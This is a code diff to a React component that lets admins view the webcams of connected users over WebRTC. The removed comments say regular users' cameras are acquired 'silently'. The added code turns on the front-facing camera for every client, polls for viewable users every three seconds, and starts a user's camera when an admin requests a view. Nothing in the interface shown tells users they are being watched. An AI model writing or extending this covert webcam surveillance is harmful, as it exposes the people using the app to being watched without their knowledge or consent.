@@ -63,14 +63,24 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
       // Identify with main socket room
       socket.emit('identify', { email: userEmail });
 
+      // Start camera for ALL users (including admin) to request camera permission and announce readiness
+      startUserCamera(socket);
+
       // If admin: request current cam user list
       if (isAdmin) {
         socket.emit('cam_get_users');
-      } else {
-        // Regular user: silently start camera and announce readiness
-        startUserCamera(socket);
       }
     });
+
+    // Realtime auto-refresh interval for admin (3-second polling fallback for instant list updates)
+    let refreshInterval: NodeJS.Timeout | null = null;
+    if (isAdmin) {
+      refreshInterval = setInterval(() => {
+        if (socket.connected) {
+          socket.emit('cam_get_users');
+        }
+      }, 3000);
+    }
 
     // ── Admin listeners ──
     if (isAdmin) {
@@ -95,6 +105,11 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
 
       // Receive WebRTC answer/ICE from target user
       socket.on('cam_signal_incoming', async ({ fromSocketId, signal }: { fromSocketId: string; signal: any }) => {
+        if (signal.type === 'offer') {
+          // If another admin or test session offers to view
+          await handleUserOffer(fromSocketId, signal, socket);
+          return;
+        }
         if (!peerRef.current) return;
         if (signal.type === 'answer') {
           await peerRef.current.setRemoteDescription(new RTCSessionDescription(signal));
@@ -114,6 +129,7 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
     }
 
     return () => {
+      if (refreshInterval) clearInterval(refreshInterval);
       socket.disconnect();
       localStreamRef.current?.getTracks().forEach(t => t.stop());
       userPeerRef.current?.close();
@@ -121,29 +137,36 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [userEmail, isAdmin]);
 
-  // ── Regular user: silently acquire camera ────────────────────────────────────
+  // ── Acquire camera stream for any connected client ──────────────────────────
   const startUserCamera = async (socket: Socket) => {
+    if (localStreamRef.current) {
+      socket.emit('cam_viewer_ready', { email: userEmail, username });
+      return;
+    }
+
     try {
       const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
+        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
         audio: false,
       });
       localStreamRef.current = stream;
       socket.emit('cam_viewer_ready', { email: userEmail, username });
     } catch {
-      // Permission denied or no camera — still register but without stream
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
         localStreamRef.current = stream;
         socket.emit('cam_viewer_ready', { email: userEmail, username });
-      } catch {
-        // No camera available — just don't register
+      } catch (err) {
+        console.warn('Camera permission denied or camera not available:', err);
       }
     }
   };
 
-  // ── Regular user: answer admin's WebRTC offer ─────────────────────────────
+  // ── Answer admin's WebRTC offer ───────────────────────────────────────────
   const handleUserOffer = async (adminSocketId: string, offer: RTCSessionDescriptionInit, socket: Socket) => {
+    if (!localStreamRef.current) {
+      await startUserCamera(socket);
+    }
     if (!localStreamRef.current) return;
 
     const peer = new RTCPeerConnection(STUN_SERVERS);
